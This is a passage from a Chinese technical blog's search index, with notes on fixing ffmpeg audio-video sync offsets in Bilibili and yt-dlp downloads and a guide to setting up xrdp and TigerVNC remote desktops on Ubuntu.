\"[0:v]setpts=PTS-STARTPTS[v];[0:a]asetpts=PTS-STARTPTS[a]\" -map \"[v]\" -map \"[a]\" setpts.mkv\n</code></pre> <pre><code>Input #0, matroska,webm, from 'setpts.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.01, start: 0.000000, bitrate: 20558 kb/s\n  Stream #0:0: Video: h264 (High 10), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10, progressive), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 119.88 tbc (default)\n    Metadata:\n      ENCODER         : Lavc58.134.100 libx264\n      DURATION        : 00:08:40.540000000\n  Stream #0:1: Audio: vorbis, 48000 Hz, 5.1, fltp (default)\n    Metadata:\n      ENCODER         : Lavc58.134.100 libvorbis\n      DURATION        : 00:08:41.006000000\nstart_pts=0\nstart_time=0.000000\nstart_pts=0\nstart_time=0.000000\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u731c\u60f3\u95ee\u9898\u539f\u56e0","title":"\u731c\u60f3\u95ee\u9898\u539f\u56e0","text":"<p>\u53ef\u4ee5\u770b\u5230\u6211\u4e0a\u4f20\u5230 B \u7ad9\u7684\u6587\u4ef6\u89c6\u9891\u6d41\u7684\u8d77\u59cb\u5e27\u7684 pts \u4e3a 0.613s\uff0c\u5dee\u4e0d\u591a\u6b63\u662f B \u7ad9\u97f3\u753b\u4e0d\u540c\u6b65\u7684\u65f6\u95f4</p> <pre><code>Input #0, matroska,webm, from 'src.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.15, start: 0.000000, bitrate: 24909 kb/s\n  Stream #0:0: Video: hevc (Main 10), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 59.94 tbc (default)\n    Metadata:\n      DURATION        : 00:08:41.149000000\n  Stream #0:1: Audio: aac_latm (LC) ([2][22][0][0] / 0x1602), 48000 Hz, 5.1, fltp (default)\n    Metadata:\n      DURATION        : 00:08:41.002000000\nstart_pts=613\nstart_time=0.613000\nstart_pts=0\nstart_time=0.000000\n</code></pre> <p>\u5e76\u4e14\u7ecf\u8fc7\u5f88\u591a\u6b21\u8f6c\u7801\u5b9e\u9a8c\uff0c\u53d1\u73b0\u8f6c\u7801\u5e76\u4e0d\u80fd\u91cd\u7f6e\u6389\u8fd9\u4e2a start_pts\uff0c\u800c\u662f\u57fa\u672c\u5b8c\u5168\u4fdd\u7559</p> <pre><code>src.hevc.aac.60fps.mkv  start_pts=638\nsrc.hevc.aac.mkv  start_pts=638\nsrc.avc.mkv start_pts=638\n</code></pre> <p>\u800c start_pts \u7684\u542b\u4e49\u4fbf\u662f\u89c6\u9891\u7684\u7b2c\u4e00\u5e27\u5e94\u8be5\u663e\u793a\u51fa\u6765\u7684\u65f6\u95f4\u3002 \u5982\u679c\u6211\u628a\u8fd9\u4e2a pts \u91cd\u7f6e\u4e3a 0\uff0c\u89c6\u9891\u5c31\u4f1a\u6bd4\u97f3\u9891\u63d0\u524d\uff08\u5047\u8bbe\u539f\u672c\u7684 pts\uff0c\u97f3\u753b\u662f\u540c\u6b65\u7684\u8bdd\uff09</p> <p>\u800c yt-dlp \u4e0b\u8f7d B \u7ad9\u89c6\u9891\u65f6\uff0c\u89c6\u9891\u548c\u97f3\u9891\u662f\u5206\u5f00\u4e0b\u8f7d\uff0c\u6700\u540e\u518d\u5408\u5e76\u6210\u4e00\u4e2a\u89c6\u9891\u7684\u3002 \u6211\u89c2\u5bdf\u4e86\u597d\u51e0\u4e2a yt-dlp \u4e0b\u8f7d\u7684\u89c6\u9891\uff0c\u53d1\u73b0 start_pts \u90fd\u53d8\u6210\u4e86 0\u3002\u6240\u4ee5\u731c\u6d4b\uff1a</p> <ul> <li>B \u7ad9\u8f6c\u7801\u7684\u65f6\u5019\u5c06 pts \u91cd\u7f6e\u4e3a\u4e86 0\uff08\u6bcf\u4e2a frame \u505a\u5982\u4e0b filter\uff1a<code>[0:v]setpts=PTS-STARTPTS[v]</code>\uff09</li> <li>\u540e\u9762\u53d1\u73b0 yt-dlp \u5408\u5e76\u65f6\u4e22\u5f03\u4e86\u539f\u672c\u7684 ts\uff0c\u5c06\u4e24\u4e2a\u6d41\u5f53\u4f5c start_pts=0 \u8fdb\u884c\u5408\u5e76\u7684\u3002B \u7ad9\u7684\u89c6\u9891\u548c\u97f3\u9891\u6587\u4ef6\u662f\u6709 offset</li> <li>\u4f46\u662f\u5373\u4f7f\u624b\u52a8-copyts \u5408\u5e76\uff0c\u4ecd\u7136\u4e0d\u540c\u6b65\uff0c\u5e76\u4e14\u8fd9\u6b21\u53d8\u6210\u97f3\u9891\u63d0\u524d\u4e86\u3002 UDPATE: \u662f yt-dlp \u4f1a\u6e05\u9664 timestamps\u3002\u4e0d\u8fc7\u8fd9\u91cc\u7684\u95ee\u9898\u5728\u4e8e B \u7ad9\u597d\u50cf\u4e5f\u5ffd\u7565\u4e86\u65f6\u95f4\u6233\uff0c\u5bfc\u81f4\u4e0d\u540c\u6b65</li> </ul> <p>\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u4e00\u5f00\u59cb\u4f7f\u7528-ss \u526a\u8f91\u51fa 8 \u5206\u949f\u7684\u7247\u6bb5\u65f6\uff0cpts \u4e3a 613 \u800c\u4e0d\u662f\u5e72\u8106\u7f6e\u4e3a 0\u3002\u6000\u7591\u6d41\u590d\u5236\u60c5\u51b5\uff0c\u53ea\u80fd seek \u5230 pos \u4e4b\u540e\u7684\u4e00\u4e2a\u5173\u952e\u5e27\uff08\u800c\u4e0d\u662f chatgpt \u544a\u8bc9\u6211\u7684 seek \u5230\u4e4b\u524d\u7684\u5173\u952e\u5e27\uff09</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u53d1\u73b0\u539f\u59cb\u89c6\u9891\u6709\u4e24\u4e2a-audio","title":"\u53d1\u73b0\u539f\u59cb\u89c6\u9891\u6709\u4e24\u4e2a audio","text":"<pre><code>Input #0, mpegts, from '2022-12-31 \u7b2c73\u56deNHK \u7d05\u767d\u6b4c\u5408\u6226 NHK BS4K.m2ts':\n  Duration: 04:25:01.42, start: 61.462067, bitrate: 26406 kb/s\n  Program 101\n  Stream #0:0[0x1011]: Video: hevc (Main 10) (HESE / 0x45534548), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 90k tbn, 59.94 tbc\n  Stream #0:1[0x1100]: Audio: aac_latm (LC) ([17][0][0][0] / 0x0011), 48000 Hz, stereo, fltp\n  Stream #0:2[0x1c00]: Data: bin_data ([6][0][0][0] / 0x0006)\n  Stream #0:3[0x1c01]: Data: bin_data ([6][0][0][0] / 0x0006)\n  Stream #0:4[0x1101]: Audio: aac_latm (LC) ([17][0][0][0] / 0x0011), 48000 Hz, stereo, fltp\nUnsupported codec with id 100359 for input stream 2\nUnsupported codec with id 100359 for input stream 3\nstart_pts=5577842\nstart_time=61.976022\nstart_pts=5531586\nstart_time=61.462067\nstart_pts=5531586\nstart_time=61.462067\nstart_pts=5531586\nstart_time=61.462067\nstart_pts=5589186\nstart_time=62.102067\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#youtube-\u6ca1\u95ee\u9898","title":"youtube \u6ca1\u95ee\u9898","text":"<p>yt-dlp \u5408\u5e76\u89c6\u9891\u548c\u97f3\u9891\u65f6\uff0c\u7a76\u7adf\u662f\u5982\u4f55\u5bf9\u51c6 ts \u7684\uff1f</p> <pre><code>Input #0, mpegts, from 'youtube.f312.mp4':\n  Duration: 00:08:41.15, start: 0.016678, bitrate: 5441 kb/s\n  Program 1\n  Stream #0:0[0x100]: Video: h264 (High) ([27][0][0][0] / 0x001B), yuv420p(tv, bt709, progressive), 1920x1080 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 90k tbn, 119.88 tbc\nstart_pts=1501\nstart_time=0.016678\n\nInput #0, mov,mp4,m4a,3gp,3g2,mj2, from 'youtube.f380.m4a':\n  Metadata:\n    major_brand     : dash\n    minor_version   : 0\n    compatible_brands: iso6mp41\n    creation_time   : 2024-01-02T23:44:20.000000Z\n  Duration: 00:08:41.15, start: 0.000000, bitrate: 384 kb/s\n  Stream #0:0(und): Audio: ac3 (ac-3 / 0x332D6361), 48000 Hz, 5.1(side), fltp, 384 kb/s (default)\n    Metadata:\n      creation_time   : 2024-01-02T23:44:20.000000Z\n      handler_name    : ISO Media file produced by Google Inc.\n      vendor_id       : [0][0][0][0]\n    Side data:\n      audio service type: main\nstart_pts=0\nstart_time=0.000000\n\nInput #0, matroska,webm, from 'youtube.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.15, start: 0.000000, bitrate: 5661 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(tv, bt709, progressive), 1920x1080 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 119.88 tbc (default)\n    Metadata:\n      DURATION        : 00:08:41.154000000\n  Stream #0:1: Audio: ac3, 48000 Hz, 5.1(side), fltp, 384 kb/s (default)\n    Metadata:\n      HANDLER_NAME    : ISO Media file produced by Google Inc.\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:08:41.152000000\nstart_pts=0\nstart_time=0.000000\nstart_pts=0\nstart_time=0.000000\n</code></pre> <p>\u624b\u52a8 merge + -copyts</p> <pre><code>Input #0, matroska,webm, from 'youtube-hand-merge2.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.17, start: 0.000000, bitrate: 5661 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(tv, bt709, progressive), 1920x1080 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 119.88 tbc (default)\n    Metadata:\n      DURATION        : 00:08:41.171000000\n  Stream #0:1: Audio: ac3, 48000 Hz, 5.1(side), fltp, 384 kb/s (default)\n    Metadata:\n      HANDLER_NAME    : ISO Media file produced by Google Inc.\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:08:41.152000000\nstart_pts=17\nstart_time=0.017000\nstart_pts=0\nstart_time=0.000000\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u8bbe\u7f6e\u8f93\u5165\u548c\u8f93\u51fa-pts","title":"\u8bbe\u7f6e\u8f93\u5165\u548c\u8f93\u51fa pts","text":"<p>\u5c1d\u8bd5 cut + reset offset</p> <ul> <li>\u91cd\u70b9\u5728\u4e8e-itsoffset \u662f\u5bf9\u8f93\u5165\u7684\u6587\u4ef6\u7684\u6240\u6709\u6d41\u52a0\u4e0a\u4e00\u4e2a\u504f\u79fb</li> <li>\u800c output \u5219\u662f\u5bf9\u8f93\u51fa\u7684\u518d\u52a0\u4e0a\u4e2a\u504f\u79fb</li> </ul> <pre><code>ffmpeg -vn -ss 0.613 -itsoffset 0.613 -i ../src.mkv -an -i ../src.mkv -c copy -map 0:a -map 1:v -output_ts_offset -0.613 output_combined.mkv\n\n\nInput #0, matroska,webm, from 'output_combined.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:40.59, start: 0.000000, bitrate: 24935 kb/s\n  Stream #0:0: Audio: aac_latm (LC) ([2][22][0][0] / 0x1602), 48000 Hz, 5.1, fltp (default)\n    Metadata:\n      DURATION        : 00:08:40.438000000\n  Stream #0:1: Video: hevc (Main 10), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 59.94 tbc (default)\n    Metadata:\n      DURATION        : 00:08:40.585000000\nstart_pts=55\nstart_time=0.055000\nstart_pts=0\nstart_time=0.000000\n</code></pre> <p>\u6587\u4ef6 duration \u7684\u4e0d\u53ef\u9760\uff0c\u662f\u5305\u542b\u4e86 start_pts \u7684</p> <ul> <li>\u8fd9\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u4ece B \u7ad9\u4e0b\u8f7d\u7684\u6587\u4ef6\uff0cstart_pts \u53d8 0 \u540e\uff0c\u4e3a\u4ec0\u4e48 duration \u76f8\u5dee\u5f88\u5927</li> <li>\u76f8\u5f53\u4e8e stream \u548c\u6587\u4ef6 duration\uff0cduration \u90fd\u662f\u8ba1\u7b97\u6700\u957f\u7684\uff1f</li> </ul>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/","title":"vnc \u548c rdp \u8fdc\u7a0b","text":"","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u8bf4\u660e","title":"\u8bf4\u660e","text":"<p>\u5199\u8fd9\u4e2a\u7684\u539f\u56e0\u662f\uff0c\u7f51\u7edc\u4e0a\u7684\u6559\u7a0b\u771f\u7684\u592a\u70c2\u4e86\u3002\u6bd4\u5982\uff1a</p> <ul> <li>\u6ca1\u6709\u8bf4\u660e\u5c31\u9ed8\u8ba4\u7528 centos</li> <li>\u9ed8\u8ba4\u662f\u670d\u52a1\u5668\u7248\u672c\u7684 Linux \u53d1\u884c\u7248\uff0c\u6ca1\u6709\u684c\u9762\u73af\u5883</li> <li>\u684c\u9762\u73af\u5883\u9ed8\u8ba4\u7528 xfce\uff0c\u800c\u5f88\u5c11\u6709 gnome \u7684</li> <li>vnc \u5404\u79cd\u7248\u672c\uff0c\u9ed8\u8ba4\u53ea\u8bf4\u660e\u5176\u4e2d\u4e00\u79cd</li> <li>xstartup \u6ca1\u6709\u4efb\u4f55\u8bf4\u660e\uff0c\u5982\u4f55\u914d\u7f6e</li> </ul> <p>\u5404\u79cd remote desktop \u8f6f\u4ef6\uff0c\u53ef\u4ee5\u770b\u5230\u6700\u8fd1\u66f4\u65b0\u65f6\u95f4</p> <ul> <li>Comparison of remote desktop software - Wikipedia</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#rdp","title":"RDP","text":"<p>RDP \u662f Windows \u8fdc\u7a0b\u684c\u9762\u4f7f\u7528\u7684\u4e00\u79cd\u4e13\u5229\u534f\u8bae\u3002</p> <p>Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection.[1] The user employs RDP client software for this purpose, while the other computer must run RDP server software.Clients exist for most versions of Microsoft Windows (including Windows Mobile), Linux, Unix, macOS, iOS, Android, and other operating systems. RDP servers are built into Windows operating systems; an RDP server for Unix and OS X also exists. By default, the server listens on TCP port 3389[2] and UDP port 3389.[3]</p> <p>\u4f46\u662f\u4e0d\u77e5\u600e\u4e48\u505a\u5230\u7684\uff0clinux \u4e0b\u4e5f\u6709 rdp server \u7684\u5f00\u6e90\u5b9e\u73b0\u2014\u2014xrdp</p> <p>neutrinolabs/xrdp: xrdp: an open source RDP server (github.com)</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<ul> <li>\u5bf9\u4e8e\u670d\u52a1\u5668 linux \u9700\u8981\u5b89\u88c5\u684c\u9762\u73af\u5883\uff0c\u5982 xfce\uff0cGnome\uff08\u4e0d\u77e5\u4e3a\u4f55\u7f51\u4e0a\u641c\u7d22\u6559\u7a0b\u5168\u90e8\u90fd\u9ed8\u8ba4\u4f60\u6ca1\u6709\u684c\u9762\u73af\u5883\uff0c\u5e76\u4e14\u90fd\u53eb\u4f60\u5b89\u88c5 xfce\uff0c\u611f\u89c9\u5f88\u5947\u602a\uff09</li> </ul> <ul> <li> <p>\u5b89\u88c5\u53ea\u9700\u8981\u4e00\u884c\u547d\u4ee4</p> <pre><code>sudo apt install xrdp\n</code></pre> </li> </ul> <ul> <li> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 systemctl \u770b\u5230\u670d\u52a1\u6b63\u5728\u8fd0\u884c\u4e86</p> <pre><code>sudo systemctl status xrdp\n</code></pre> <p>xrdp \u76d1\u542c\u7684\u7aef\u53e3\u548c windows \u4e00\u6837\u4e5f\u662f 3389\uff0c\u9700\u8981\u6253\u5f00\u9632\u706b\u5899\u3002</p> </li> </ul> <ul> <li>\u7136\u540e\u4fbf\u53ef\u4ee5\u901a\u8fc7 RDP \u5ba2\u6237\u7aef\u8fde\u63a5\u4f7f\u7528\u4e86</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u95ee\u9898","title":"\u95ee\u9898","text":"<ul> <li>\u663e\u793a\u9ed1\u5c4f\uff1axrdp \u53ea\u652f\u6301\u540c\u4e00\u4e2a\u7528\u6237\u767b\u5f55\u4e00\u4e2a\u684c\u9762\u3002\u56e0\u6b64\u9700\u8981\u628a\u5176\u4ed6\u767b\u5f55\u4e86\u684c\u9762\u7684\u7528\u6237\u9000\u51fa\u3002</li> </ul> <ul> <li>\u663e\u793a\u5361\u987f\uff1a\u7f51\u4e0a\u6709\u7c7b\u4f3c\u95ee\u9898\uff0c\u4f46\u662f\u8fd8\u4e0d\u77e5\u5982\u4f55\u89e3\u51b3</li> <li>\u540c\u6837\u6709\u4efb\u52a1\u680f (dock) \u4e0d\u663e\u793a\u95ee\u9898</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#rdp-client","title":"RDP client","text":"<p>Remote Desktop Protocol - Wikipedia #Non-Microsoft implementations</p> <ul> <li>mstsc.exe \u7684\u5168\u540d\u662f (microsoft terminal service client)</li> </ul> <ul> <li>rdesktop -&gt; FreeRDP -&gt; Remmina<ul> <li>rdesktop \u5f88\u8001</li> <li>\u547d\u4ee4\u884c\u7528 FreeRDP</li> <li>GUI \u7528 Remmina\uff08\u57fa\u4e8e FreeRDP\uff09</li> </ul> </li> </ul> <ul> <li>server<ul> <li>xrdp</li> </ul> </li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#vnc","title":"VNC","text":"<p>VNC \u5219\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u534f\u8bae\u7528\u4e8e\u8fdc\u7a0b\u63a7\u5236\u8ba1\u7b97\u673a</p> <p>In computing, Virtual Network Computing (VNC) is a graphical desktop-sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse input from one computer to another, relaying the graphical-screen updates, over a network.[1]</p> <p>linux \u4e0b\u6709\u597d\u591a\u4e0d\u540c\u7684 vncserver\uff0c\u5982 tightvnc, tigervnc, ultravnc \u7b49\uff0c\u4e0d\u540c vncserver \u7684\u547d\u4ee4\u4e0d\u540c\uff0c\u914d\u7f6e\u6587\u4ef6\u4e0d\u540c\uff0c\u7f51\u4e0a\u6559\u7a0b\u6bd4\u8f83\u6742\u4e71\u3002\u8fd9\u91cc\u4ee5 tigervnc \u4e3a\u8bf4\u660e\u3002</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#tigervnc-ubuntu2004","title":"tigervnc ubuntu20.04","text":"<pre><code>sudo apt install tigervnc-standalone-server\n\nvncserver -localhost no :1\n</code></pre>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#xfce4","title":"xfce4","text":"<p>vncserver 1.7 failed command /etc/X11/Xvnc-session Debian Stretch (google.com)</p> <pre><code>vncserver -localhost no :1 -xstartup ~/.vnc/xstartup-xfce4\n</code></pre> <p>xstartup-xfce4</p> <pre><code>#! /bin/sh  \n\ntest x\"$SHELL\" = x\"\" &amp;&amp; SHELL=/bin/bash  \ntest x\"$1\"\u00a0\u00a0\u00a0\u00a0 = x\"\" &amp;&amp; set -- default  \n\nvncconfig -iconic &amp;  \n$SHELL -l &lt;&lt;EOF\n\n\nxterm -geometry 80x24+10+10 -ls -title \"$VNCDESKTOP Desktop\" &amp;  \n\nDESKTOP_SESSION=xfce  \nexport DESKTOP_SESSION  \nstartxfce4\n</code></pre>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u9047\u5230\u95ee\u9898","title":"\u9047\u5230\u95ee\u9898","text":"<p>20.04 - Can't open terminal through tightvncserver on Ubuntu 20 / no gnome panel - Ask Ubuntu vnc \u70b9\u51fb terminal \u65e0\u6cd5\u5e94 \u539f\u56e0\uff1a</p> <ul> <li>\u5bf9\u4e8e xfce \u70b9\u51fb terminal\uff0c\u9ed8\u8ba4\u6253\u5f00\u00a0x-terminal-emulator\uff0c\u800c\u5b83\u94fe\u63a5\u5230 gnome-terminal warpper\u3002<ul> <li>You can get this info from Applications-&gt;File Manager-&gt;Edit-&gt;Configure custom actions..., and Applications-&gt;Settings-&gt;Settings Manager-&gt;Preferred Applications-&gt;Utilities, also to trace the symlink of x-terminal-emulator.</li> </ul> </li> <li>\u5361\u4f4f\u662f\u56e0\u4e3a\u5728\u5c1d\u8bd5\u8fde\u63a5 d-bus\u3002The thing is that gnome-terminal is trying to connect to D-Bus but failed to get a response and timed out, to verify it you could launch D-Bus first, e.g.\u00a0<code>$ dbus-launch gnome-terminal</code>\u00a0and you will see a gnome terminal pops up.</li> <li>\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u662f\u6362\u4e00\u4e2a terminal\u3002\u5982 Applications-&gt;System-&gt;Xfce Terminal\u3002\u6216\u8005<code>sudo update-alternatives --config x-terminal-emulator</code>\u4fee\u6539\u9ed8\u8ba4\u7684 terminal\u3002\u53ef\u4ee5\u9009\u62e9 xfce4-terminal \u6216\u8005 xterm</li> <li> <p>\u5982\u679c\u60f3\u8981\u4f7f\u7528 gnome-terminal\u3002\u5c06\u4ee5\u4e0b\u4ee3\u7801\u63d2\u5165 xstartup \u4e2d startxfce4 \u4e4b\u524d\u5373\u53ef</p> <pre><code>xrdb $HOME/.Xresources \nxsetroot -solid grey\n\nexport XKL_XMODMAP_DISABLE=1 \nexport XDG_CURRENT_DESKTOP=\"GNOME-Flashback:Unity\" \nexport XDG_MENU_PREFIX=\"gnome-flashback-\"\n\nunset DBUS_SESSION_BUS_ADDRESS\n\ngnome-session --session=gnome-flashback-metacity --disable-acceleration-check &amp;\n</code></pre> </li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#tigervnc","title":"tigervnc","text":"<p>\u53c2\u8003\uff1a</p> <ul> <li>VNC/Servers - Community Help Wiki (ubuntu.com)</li> <li>VNC \u7684\u5b89\u88c5\u4e0e\u4f7f\u7528 - SYAO<ul> <li>\u6ce8\u610f\u8be5\u6559\u7a0b\u9488\u5bf9 1.11 \u7248\u672c\uff0c1.12 \u4e2d\u914d\u7f6e\u6587\u4ef6\uff0csystemd service \u540d\u79f0\u6539\u53d8\u4e86\u3002</li> </ul> </li> <li>TigerVNC/tigervnc: High performance, multi-platform VNC client and server (github.com)<ul> <li>readme \u4e2d\u7684\u5173\u4e8eXvnc,vncserver@.service\u4ecb\u7ecd\u5df2\u7ecf\u8fc7\u65f6\u4e86\uff08\u540d\u5b57\u53d8\u5316\u4e86\uff09</li> </ul> </li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u4f7f\u7528\u60c5\u51b5","title":"\u4f7f\u7528\u60c5\u51b5","text":"<ul> <li>\u53f0\u5f0f\u673a\u79bb\u5f00\u4e0d\u7528\u65f6\uff0c\u70b9\u51fb\u6ce8\u9500\uff0cwin+L \u9501\u5c4f\u662f\u4e0d\u591f\u7684\u3002\u6ce8\u9500\u540e\uff0c\u67e5\u770b\u8fd0\u884c\u7684 Xserver \u4f1a\u53d1\u73b0\u4ece X1 \u53d8\u6210\u4e86 X0\u3002</li> <li>vnc \u8fdc\u7a0b\u4e0d\u518d\u4f7f\u7528\u540e\uff0c\u53ef\u4ee5 systemctl stop \u6389\u670d\u52a1\uff0c\u4e5f\u53ef\u4ee5\u70b9\u51fb\u6ce8\u9500\u3002\u6b64\u65f6 vnc \u7684 Xserver \u4e5f\u4f1a\u5173\u95ed\u3002</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u684c\u9762\u73af\u5883","title":"\u684c\u9762\u73af\u5883","text":"<p>\u9700\u8981\u6709\u4e00\u4e2a\u684c\u9762\u73af\u5883 (desktop environment)</p> <p>ubuntu desktop \u7248\u4f7f\u7528\u81ea\u5e26\u7684 GNOME \u684c\u9762\u5373\u53ef\uff0c\u6216\u8005\u53c2\u8003\u5982\u4f55\u5b89\u88c5\u4e0d\u540c\u684c\u9762\u73af\u5883\uff0c\u5982 xfce\uff1aHow to Install and Use Another Desktop Environment on Linux (howtogeek.com)</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u5b89\u88c5-tigervnc","title":"\u5b89\u88c5 tigervnc","text":"<ul> <li> <p>apt \u641c\u7d22 tigervnc \u6709\u5f88\u591a\u5305\uff0c\u9700\u8981\u786e\u5b9a\u54ea\u4e2a\u5305\u5305\u542b vnc server</p> <pre><code>~ apt search tigervnc\n\ntigervnc-common/jammy,now 1.12.0+dfsg-4 amd64 [\u5df2\u5b89\u88c5\uff0c\u81ea\u52a8]\n  Virtual network computing; Common software needed by servers\n\ntigervnc-scraping-server/jammy 1.12.0+dfsg-4 amd64\n  Virtual network computing server performing X screen scraping\n\ntigervnc-standalone-server/jammy,now 1.12.0+dfsg-4 amd64 [\u5df2\u5b89\u88c5]\n  Standalone virtual network computing server\n\ntigervnc-tools/jammy,now 1.12.0+dfsg-4 amd64 [\u5df2\u5b89\u88c5\uff0c\u81ea\u52a8]\n  Virtual network computing; Tools for both clients and servers\n\ntigervnc-viewer/jammy 1.12.0+dfsg-4 amd64\n  Virtual network computing client for X\n\ntigervnc-xorg-extension/jammy 1.12.0+dfsg-4 amd64\n  Virtual network computing X server extension\n</code></pre> </li> </ul> <ul> <li> <p>\u53ef\u4ee5\u5728Ubuntu \u2013 Ubuntu Packages Search\u641c\u7d22\uff0c\u67e5\u770b\u5305\u91cc\u9762\u5305\u542b\u54ea\u4e9b\u5185\u5bb9\u3002\u6bd4\u5982 tigervnc-standalone-server</p> <p>https://packages.ubuntu.com/jammy/amd64/tigervnc-standalone-server/filelist</p> <pre><code>/etc/X11/Xtigervnc-session\n/etc/tigervnc/vncserver.users\n/lib/systemd/system/tigervncserver@.service\n/usr/bin/Xtigervnc\n/usr/bin/tigervncserver\n/usr/libexec/tigervncsession-start\n/usr/sbin/tigervncsession\n/usr/share/doc/tigervnc-standalone-server/changelog.Debian.gz\n/usr/share/doc/tigervnc-standalone-server/copyright\n/usr/share/man/man1/Xtigervnc.1.gz\n/usr/share/man/man1/tigervncserver.1.gz\n/usr/share/man/man8/tigervncsession.8.gz\n</code></pre> 